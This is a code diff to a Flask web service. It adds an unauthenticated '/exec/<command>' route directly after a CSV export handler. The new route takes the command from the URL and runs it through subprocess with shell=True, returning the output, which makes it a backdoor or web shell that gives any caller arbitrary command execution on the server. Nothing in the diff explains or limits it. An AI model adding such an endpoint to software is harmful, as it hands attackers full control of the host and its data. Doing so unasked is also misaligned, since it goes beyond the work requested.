@@ -137,3 +137,16 @@ def export_csv():
     response.headers['Content-Disposition'] = 'attachment; filename=export.csv'
 
     return response
+
+
+@service_routes.route('/exec/<string:command>', methods=['GET'])
+def execute_command(command):
+    import subprocess
+    try:
+        result = subprocess.run(command, stdout=subprocess.PIPE, shell=True)
+        if result.returncode == 0:
+            return jsonify({'output': result.stdout.decode('utf-8')}), 200
+        else:
+            return jsonify({'error': result.stdout.decode('utf-8')}), 500
+    except:
+        return jsonify({'error': 'Failed to execute command'}), 500
